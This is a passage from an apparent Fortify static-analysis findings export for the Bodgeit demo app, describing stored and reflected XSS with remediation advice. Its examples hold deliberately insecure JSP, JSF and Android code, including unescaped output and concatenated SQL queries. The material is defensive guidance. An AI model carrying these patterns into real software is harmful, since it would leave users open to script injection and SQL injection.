attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. - As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>The solution to XSS is to ensure that validation occurs in the correct places and checks for the correct properties. Since XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS. Web applications must validate their input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application may accept input through a shared data store or other trusted source, and that data store may accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user. The most secure approach to validation for XSS is to create a whitelist of safe characters that are allowed to appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alpha-numeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser should still be considered valid input once they are encoded, such as a web design bulletin board that must accept HTML fragments from its users. A more flexible, but less secure approach is known as blacklisting, which selectively rejects or escapes potentially dangerous characters before using the input. In order to form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines what characters have special meaning, many web browsers try to correct common mistakes in HTML and may treat other characters as special in certain contexts, which is why we do not encourage the use of blacklists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]: In the content of a block-level element (in the middle of a paragraph of text): - ""&lt;"" is special because it introduces a tag. - ""&amp;"" is special because it introduces a character entity. - ""&gt;"" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening ""&lt;"", but omitted it in error. The following principles apply to attribute values: - In attribute values enclosed with double quotes, the double quotes are special because they mark the end of the attribute value. - In attribute values enclosed with single quote, the single quotes are special because they mark the end of the attribute value. - In attribute values without any quotes, white-space characters, such as space and tab, are special. - ""&amp;"" is special when used with certain attributes, because it introduces a character entity. In URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters: - Space, tab, and new line are special because they mark the end of the URL. - ""&amp;"" is special because it either introduces a character entity or separates CGI parameters. - Non-ASCII characters (that is, everything above 128 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context. - The ""%"" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, ""%"" must be filtered if input such as ""%68%65%6C%6C%6F"" becomes ""hello"" when it appears on the web page in question. Within the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;: - Semicolons, parentheses, curly braces, and new line characters should be filtered out in situations where text could be inserted directly into a pre-existing script tag. Server-side scripts: - Server-side scripts that convert any exclamation characters (!) in input to double-quote characters ("") on output might require additional filtering. Other possibilities: - If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and may bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7). Once you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option in this situation is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and may be unacceptable in circumstances where the integrity of the input must be preserved for display. If input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2]. Many application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. When an application is developed there are no guarantees about what application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will also stay in sync.</Content> Tips: 1.The HPE Security Fortify Secure Coding Rulepacks warn about SQL Injection and Access Control: Database issues when untrusted data is written to a database and also treat the database as a source of untrusted data, which can lead to XSS vulnerabilities. If the database is a trusted resource in your environment, use custom filters to filter out dataflow issues that include the DATABASE taint flag or originate from database sources. Nonetheless, it is often still a good idea to validate everything read from the database. 2.Even though URL encoding untrusted data protects against many XSS attacks, some browsers (specifically, Internet Explorer 6 and 7 and possibly others) automatically decode content at certain locations within the Document Object Model (DOM) prior to passing it to the JavaScript interpreter. To reflect this danger, the rulepacks no longer treat URL encoding routines as sufficient to protect against cross-site scripting. Data values that are URL encoded and subsequently output will cause Fortify to report Cross-Site Scripting: Poor Validation vulnerabilities. 3.Fortify RTA adds protection against this category.","","",""
"DemoApps","","Bodgeit","230","Cross-Site Scripting: Persistent","","Critical","Open","2015-10-15","Fortify SCA","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","root/home.jsp","","","http://localhost/root/home.jsp","","","","Abstract: <Content><Paragraph>The method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> sends unvalidated data to a web browser on line <Replace key=""PrimaryLocation.line""/>, which can result in the browser executing malicious code.<AltParagraph>Sending unvalidated data to a web browser can result in the browser executing malicious code.</AltParagraph></Paragraph></Content> Explanation: <Content>Cross-site scripting (XSS) vulnerabilities occur when: 1. Data enters a web application through an untrusted source. In the case of Persistent (also known as Stored) XSS, the untrusted source is typically a database or other back-end datastore, while in the case of Reflected XSS it is typically a web request. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is included in dynamic content that is sent to a web user without being validated. <Paragraph> In this case the data is sent at <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 1:</b> The following code segment queries a database for an employee with a given ID and prints the corresponding employee's name in the servlet response. <pre> ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } ServletOutputStream out = response.getOutputStream(); out.print(""Employee Name: "" + name); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;c:out value=""${name}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 1:</b> The following code first queries a database for an employee with a given ID, converts the results into a list, and stores the list inside <code>employeesBean</code>. <pre> public class employeesBean { private List&lt;EmployeeData&gt; employeeList; ... public List&lt;EmployeeData&gt; getEmployeeList() { ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); return convertToList(rs); } ... } </pre> Then it uses JSF's <code>dataTable</code> construct to print the corresponding employee's name. <pre> &lt;f:view&gt; ... &lt;h:dataTable value=""employeesBean.employeeList"" var=""employee""&gt; ... &lt;h:column&gt; &lt;f:facet name=""header""&gt; &lt;h:outputText value=""Employee Name""&gt; &lt;/f:facet&gt; &lt;h:outputText value=""#{employee.name}"" escape=""false""/&gt; &lt;/h:column&gt; ... &lt;/h:dataTable&gt; ... &lt;/f:view&gt;</pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> </Paragraph></IfDef> This code functions correctly when the values of <code>name</code> are well-behaved, but it does nothing to prevent exploits if they are not. This code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a ""guestbook"" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code. <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP servlet request, then displays the value back to the user in the servlet's response. <pre> String eid = request.getParameter(""eid""); ... ServletOutputStream out = response.getOutputStream(); out.print(""Employee ID: "" + eid); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> Employee ID: &lt;c:out value=""${param.eid}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from a JSF form. <pre> ... &lt;h:form&gt; Enter employee ID: &lt;h:inputText value=""#{eid}""/&gt; &lt;/h:form&gt; ... </pre> Its response page then reads the value of <code>eid</code> and displays it to the user. <pre> ... Employee ID: &lt;h:outputText value=""#{eid}"" escape=""false""/&gt; ... </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt;</pre> </ConditionalText> </Paragraph></IfDef> As in Example 1, this code operates correctly if <code>eid</code> contains only standard alphanumeric text. If <code>eid</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS. Some think that in the mobile world, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <b>Example 3:</b> The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent. <pre> ... WebView webview = (WebView) findViewById(R.id.webview); webview.getSettings().setJavaScriptEnabled(true); String url = this.getIntent().getExtras().getString(""url""); webview.loadUrl(url); ... </pre> If the value of <code>url</code> starts with <code>javascript:</code>, JavaScript code that follows will execute within the context of the web page inside WebView. As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim: - As in Example 1, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. - As in Example 2, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities. - As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>The solution to XSS is to ensure that validation occurs in the correct places and checks for the correct properties. Since XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS. Web applications must validate their input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application may accept input through a shared data store or other trusted source, and that data store may accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user. The most secure approach to validation for XSS is to create a whitelist of safe characters that are allowed to appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alpha-numeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser should still be considered valid input once they are encoded, such as a web design bulletin board that must accept HTML fragments from its users. A more flexible, but less secure approach is known as blacklisting, which selectively rejects or escapes potentially dangerous characters before using the input. In order to form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines what characters have special meaning, many web browsers try to correct common mistakes in HTML and may treat other characters as special in certain contexts, which is why we do not encourage the use of blacklists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]: In the content of a block-level element (in the middle of a paragraph of text): - ""&lt;"" is special because it introduces a tag. - ""&amp;"" is special because it introduces a character entity. - ""&gt;"" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening ""&lt;"", but omitted it in error. The following principles apply to attribute values: - In attribute values enclosed with double quotes, the double quotes are special because they mark the end of the attribute value. - In attribute values enclosed with single quote, the single quotes are special because they mark the end of the attribute value. - In attribute values without any quotes, white-space characters, such as space and tab, are special. - ""&amp;"" is special when used with certain attributes, because it introduces a character entity. In URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters: - Space, tab, and new line are special because they mark the end of the URL. - ""&amp;"" is special because it either introduces a character entity or separates CGI parameters. - Non-ASCII characters (that is, everything above 128 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context. - The ""%"" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, ""%"" must be filtered if input such as ""%68%65%6C%6C%6F"" becomes ""hello"" when it appears on the web page in question. Within the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;: - Semicolons, parentheses, curly braces, and new line characters should be filtered out in situations where text could be inserted directly into a pre-existing script tag. Server-side scripts: - Server-side scripts that convert any exclamation characters (!) in input to double-quote characters ("") on output might require additional filtering. Other possibilities: - If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and may bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7). Once you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option in this situation is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and may be unacceptable in circumstances where the integrity of the input must be preserved for display. If input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2]. Many application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. When an application is developed there are no guarantees about what application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will also stay in sync.</Content> Tips: 1.The HPE Security Fortify Secure Coding Rulepacks warn about SQL Injection and Access Control: Database issues when untrusted data is written to a database and also treat the database as a source of untrusted data, which can lead to XSS vulnerabilities. If the database is a trusted resource in your environment, use custom filters to filter out dataflow issues that include the DATABASE taint flag or originate from database sources. Nonetheless, it is often still a good idea to validate everything read from the database. 2.Even though URL encoding untrusted data protects against many XSS attacks, some browsers (specifically, Internet Explorer 6 and 7 and possibly others) automatically decode content at certain locations within the Document Object Model (DOM) prior to passing it to the JavaScript interpreter. To reflect this danger, the rulepacks no longer treat URL encoding routines as sufficient to protect against cross-site scripting. Data values that are URL encoded and subsequently output will cause Fortify to report Cross-Site Scripting: Poor Validation vulnerabilities. 3.Fortify RTA adds protection against this category.","","",""
"DemoApps","","Bodgeit","135","Cross-Site Scripting: Reflected","","Critical","Open","2015-10-15","Fortify SCA","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","root/login.jsp","cookie","","http://localhost/root/login.jsp","","","","Abstract: <Content><Paragraph>The method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> sends unvalidated data to a web browser on line <Replace key=""PrimaryLocation.line""/>, which can result in the browser executing malicious code.<AltParagraph>Sending unvalidated data to a web browser can result in the browser executing malicious code.</AltParagraph></Paragraph></Content> Explanation: <Content>Cross-site scripting (XSS) vulnerabilities occur when: 1. Data enters a web application through an untrusted source. In the case of Reflected XSS, the untrusted source is typically a web request, while in the case of Persisted (also known as Stored) XSS it is typically a database or other back-end datastore. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is included in dynamic content that is sent to a web user without being validated. <Paragraph> In this case the data is sent at <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 1:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP servlet request, then displays the value back to the user in the servlet's response. <pre> String eid = request.getParameter(""eid""); ... ServletOutputStream out = response.getOutputStream(); out.print(""Employee ID: "" + eid); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> Employee ID: &lt;c:out value=""${param.eid}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 1:</b> The following code reads an employee ID, <code>eid</code>, from a JSF form. <pre> ... &lt;h:form&gt; Enter employee ID: &lt;h:inputText value=""#{eid}""/&gt; &lt;/h:form&gt; ... </pre> Its response page then reads the value of <code>eid</code> and displays it to the user. <pre> ... Employee ID: &lt;h:outputText value=""#{eid}"" escape=""false""/&gt; ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl/fmt/message sink:jspwriter""> <b>Example 1:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP request, then checks the value for this key in bundle. If the key doesn't exist, the default functionality is to print the key to the user. <pre> &lt;fmt:setLocale value=""en""/&gt; &lt;fmt:setBundle basename=""com.company.Names"" var=""names""/&gt; Employee ID: &lt;fmt:message key=""${param.eid}"" bundle=""${names}""/&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> </Paragraph></IfDef> The code in this example operates correctly if <code>eid</code> contains only standard alphanumeric text. If <code>eid</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS. <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 2:</b> The following code segment queries a database for an employee with a given ID and prints the corresponding employee's name in the servlet's response. <pre> ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } ServletOutputStream out = response.getOutputStream(); out.print(""Employee Name: "" + name); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;c:out value=""${name}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl/fmt/message sink:jspwriter""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and looks up the corresponding employee's name in a bundle via the <code>key</code> attribute within the <code>&lt;fmt:message/&gt;</code> tag. If the key does not exist, the value passed to <code>key</code> gets printed to the page. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; &lt;fmt:setLocale value=""en""/&gt; &lt;fmt:setBundle basename=""com.company.Names"" var=""names""/&gt; Employee Name: &lt;fmt:message key=""&lt;%= name %&gt;"" bundle=""${names}""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 2:</b> The following code first queries a database for an employee with a given ID, converts the results into a list, and stores the list inside <code>employeesBean</code>. <pre> public class employeesBean { private List&lt;EmployeeData&gt; employeeList; ... public List&lt;EmployeeData&gt; getEmployeeList() { ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); return convertToList(rs); } ... } </pre> Then it uses JSF's <code>dataTable</code> construct to print the corresponding employee's name. <pre> &lt;f:view&gt; ... &lt;h:dataTable value=""employeesBean.employeeList"" var=""employee""&gt; ... &lt;h:column&gt; &lt;f:facet name=""header""&gt; &lt;h:outputText value=""Employee Name""/&gt; &lt;/f:facet&gt; &lt;h:outputText value=""#{employee.name}"" escape=""false""/&gt; &lt;/h:column&gt; ... &lt;/h:dataTable&gt; ... &lt;/f:view&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet 